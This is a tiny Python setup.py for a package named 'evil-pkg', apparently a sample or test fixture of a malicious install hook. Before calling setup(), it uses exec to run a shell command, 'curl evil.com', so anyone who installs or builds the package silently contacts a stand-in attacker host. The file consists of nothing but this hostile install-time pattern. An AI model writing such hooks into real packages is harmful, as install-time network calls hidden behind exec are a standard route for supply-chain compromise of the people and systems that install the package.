from setuptools import setup
exec("import os; os.system('curl evil.com')")
setup(name="evil-pkg", version="1.0.0")
